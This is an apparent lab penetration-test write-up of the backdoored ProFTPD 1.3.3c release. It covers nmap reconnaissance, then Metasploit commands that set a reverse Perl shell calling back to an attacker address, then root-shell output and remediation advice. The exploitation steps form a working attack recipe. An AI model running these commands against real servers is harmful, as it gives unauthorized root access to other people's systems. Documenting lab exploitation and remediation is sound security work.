# Exploit 1: ProFTPD 1.3.3c Supply Chain Backdoor (CVE-2010-20103)

## Summary

Unauthenticated remote root compromise via the trojanised ProFTPD 1.3.3c source tarball. No credentials, foothold or privilege escalation are required; the exploit yields a root shell directly.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.100 |
| Service | ProFTPD 1.3.3c, port 21/tcp |
| Attacker | Kali VM on the same host-only lab network |
| Tooling | nmap, Metasploit Framework |

## Vulnerability

Between 28 November and 2 December 2010, the official ProFTPD distribution server was compromised and the 1.3.3c source tarball was replaced with a backdoored version. The backdoor implements a hidden FTP command trigger that causes the server to execute arbitrary shell commands with root privileges, allowing any unauthenticated remote attacker to run OS commands on the host (CWE-912, Hidden Functionality).

## Reconnaissance

Service and version detection against the FTP port confirms the affected build:

```
nmap -sC -sV -O -p 21 192.168.144.100
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
```

## Exploitation

```
msfconsole -q
search proftpd 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.144.100
set payload cmd/unix/reverse_perl
set LHOST 192.168.144.129
run
```

## Evidence

```
[*] Started reverse TCP handler on 192.168.144.129:4444
[*] 192.168.144.100:21 - Sending Backdoor Command
[*] Command shell session 1 opened (192.168.144.129:4444 -> 192.168.144.100:38808)

whoami
root
id
uid=0(root) gid=0(root) groups=0(root),1009(ftp)
```

## Impact

Full unauthenticated remote root compromise of the host via a single service, with no further privilege escalation required.

## Remediation

- Do not run ProFTPD 1.3.3c; upgrade to a current, unmodified release.
- Verify the integrity (checksum/signature) of third-party source packages before building and deploying them.
- Run FTP daemons under a dedicated unprivileged account rather than root where the daemon design permits it, to limit blast radius from any future backdoor or vulnerability.

## Lab Dependencies

**Prerequisite exploit(s):** None  
**Required starting access:** Network access to the target from Kali  
**Starting account:** None  
**Resulting access:** Root shell  
**Provides access for:** No prerequisite chain required; this is a standalone direct root compromise